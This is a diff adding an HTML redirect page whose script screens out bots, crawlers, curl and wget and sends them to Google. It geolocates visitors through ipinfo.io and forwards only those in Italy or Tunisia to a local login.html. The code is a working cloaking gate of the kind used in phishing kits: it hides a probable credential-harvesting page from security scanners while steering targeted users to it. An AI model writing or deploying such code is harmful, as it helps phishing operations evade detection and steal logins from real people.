@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    async function redirectBasedOnCountry() {
+      try {
+        // Anti-bot check
+        const ua = navigator.userAgent.toLowerCase();
+        const isBot = /bot|crawl|slurp|spider|curl|wget/.test(ua);
+        if (isBot) {
+          window.location.href = "https://www.google.com";
+          return;
+        }
+
+        // Country check with ipinfo.io (no API key needed for basic usage)
+        const res = await fetch("https://ipinfo.io/json?token=1c2a74e9d6cb3f"); // use a demo token or sign up for one
+        const data = await res.json();
+
+        const country = data.country;
+        console.log("Detected country:", country); // for debugging
+
+        if (country === "IT" || country === "TN") {
+          window.location.href = "login.html";
+        } else {
+          window.location.href = "https://www.google.com";
+        }
+
+      } catch (err) {
+        console.error("Geo error:", err);
+        window.location.href = "https://www.google.com";
+      }
+    }
+
+    redirectBasedOnCountry();
+  </script>
+</head>
+<body>
+  <p>Redirecting... If nothing happens, <a href="login.html">click here</a>.</p>
+</body>
+</html>
